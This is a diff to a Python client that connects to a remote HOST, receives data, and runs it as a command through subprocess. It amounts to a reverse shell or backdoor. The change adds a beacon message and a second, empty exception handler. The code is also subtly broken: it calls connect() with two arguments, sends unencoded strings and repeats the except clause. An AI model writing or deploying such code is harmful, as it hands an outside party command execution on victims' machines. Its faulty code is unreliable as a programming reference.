@@ -19,6 +19,7 @@ def shelled_stripped(data):
 
 try:
     sock_client.connect(HOST,DEFAULT_PORT)
+    sock_client.send("Connection Received.")
     data = sock_client.recv(MAX_BUFF)
     if data:
         subprocess.run(shelled_stripped(data))
@@ -26,6 +27,8 @@ try:
         while True:
             sock_client.send("")
     exit(0)
+except Exception as e:
+    print()
 
 except Exception as e:
     print("Connection failed")
